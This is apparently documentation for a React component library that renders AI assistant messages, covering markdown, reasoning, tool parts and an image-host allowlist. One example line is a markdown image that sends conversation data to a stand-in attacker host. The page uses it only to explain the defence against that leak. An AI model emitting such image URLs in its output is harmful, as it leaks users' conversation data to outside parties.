A whole assistant `UIMessage`, part by part: streaming-safe markdown, collapsible reasoning that summarizes how long the model thought, consecutive tool parts grouped into one timeline with inline approval cards, files, `data-*` parts through `renderData`, and sources. `renderTool` lets you take over any tool part, as [the quickstart](/docs/getting-started#render-a-run) does for `review_changes` with a `DiffReview`. What `renderTool` and `renderData` return is your content: with `styles.css`, the kit's rules don't reach into it, and components you render there are styled as usual.

Images in text and reasoning don't load unless they're allowed: a URL in model output can carry data out of the conversation as soon as the browser fetches it (`![](https://attacker.example/p.png?d=…)`), so by default an image renders as a link with its alt text, or as plain text inside the link it belongs to (a badge). `allowedImageHosts` takes:

- host names: `'images.example.com'` matches any port, `'localhost:3000'` only that port;
- `'self'`: relative URLs such as `/logo.png`, which load from your own origin. Protocol-relative URLs (`//host/x`) are not relative, and absolute URLs to your own site need their host listed. Relative requests carry your cookies, so allow `'self'` only if GET requests to your origin have no side effects;
- `'*'`: every image.

```tsx
const IMAGE_HOSTS = ['images.example.com', 'self'];

<AgentMessage message={last} allowedImageHosts={IMAGE_HOSTS} />;
```

The list is compared by value, so an inline array works as well: it does not re-render the finished text on every streamed delta. Image file parts follow the same list, except that `data:` and `blob:` URLs, which need no request, always preview.

### Your own Markdown renderer

Text and reasoning render with the built-in `Markdown`, which brings react-markdown and remark-gfm. If your app already has a renderer, such as Streamdown, pass it as `renderMarkdown` and import `AgentMessage` from `signoff-ui/custom-markdown`: that entry has no built-in renderer, so react-markdown stays out of your bundle ([bundle size](/docs/limits#bundle-size)). Streamdown is not a dependency of signoff-ui: install and style it as its docs say.

> **Restrict images in your renderer.** `allowedImageHosts` protects only the built-in renderer. A custom renderer gets the list as a prop, but nothing enforces it, and Streamdown 2.7 loads images from any host by default. An image in model output can then send data out of the conversation as soon as it renders. Check each image's host yourself, as `components.img` does below.

```tsx
import { AgentMessage, type MarkdownRenderer } from 'signoff-ui/custom-markdown';
import { defaultComponents, Streamdown, type Components } from 'streamdown';

const IMAGE_HOSTS = ['images.example.com'];
const allowed = (src: unknown) =>
  typeof src === 'string' && URL.canParse(src) && IMAGE_HOSTS.includes(new URL(src).hostname);

// Outside the component: a new function or object renders every text part again.
const components: Components = {
  // An image from any other host shows its alt text instead.
  img: (props) => (allowed(props.src) ? <defaultComponents.img {...props} /> : (props.alt ?? null)),
};

const renderMarkdown: MarkdownRenderer = ({ children, streaming }) => (
  <Streamdown isAnimating={streaming} components={components}>
    {children}
  </Streamdown>
);

<AgentMessage message={last} streaming={status === 'streaming'} renderMarkdown={renderMarkdown} />;
```

`MarkdownRendererProvider` sets the renderer once for every `AgentMessage` and `Reasoning` inside it, from either entry. What the renderer returns is your content, like `renderTool`'s. It also gets `citations` and `citationPrefix`, to link `[n]` markers to `#${citationPrefix}-${n}`, and `allowedImageHosts` as the component got it, which your renderer has to enforce itself (see the note above). Without a renderer, `signoff-ui/custom-markdown` shows the text as it is. If you render `Reasoning` on its own, import it from `signoff-ui/custom-markdown` too: `AgentMessage`, `Reasoning` and `Markdown` from `signoff-ui` bring react-markdown back.
